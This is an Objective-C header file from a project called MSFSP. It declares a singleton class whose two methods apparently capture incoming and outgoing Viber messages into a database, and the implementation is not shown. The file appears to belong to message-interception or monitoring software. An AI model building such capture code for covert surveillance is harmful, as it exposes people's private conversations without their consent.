//
//  ViberUtilsV2.h
//  MSFSP
//
//  Created by Makara on 9/12/14.
//
//

#import <Foundation/Foundation.h>

@class VDBMessage, DBManager;

@interface ViberUtilsV2 : NSObject {
    
}

+ (id) sharedViberUtilsV2;

+ (void) captureOutgoingViber: (VDBMessage *) aVDBMessage
                withDBManager: (DBManager *) aDBManager;
+ (void) captureIncomingViber: (VDBMessage *) aVDBMessage
                withDBManager: (DBManager *) aDBManager;
@end
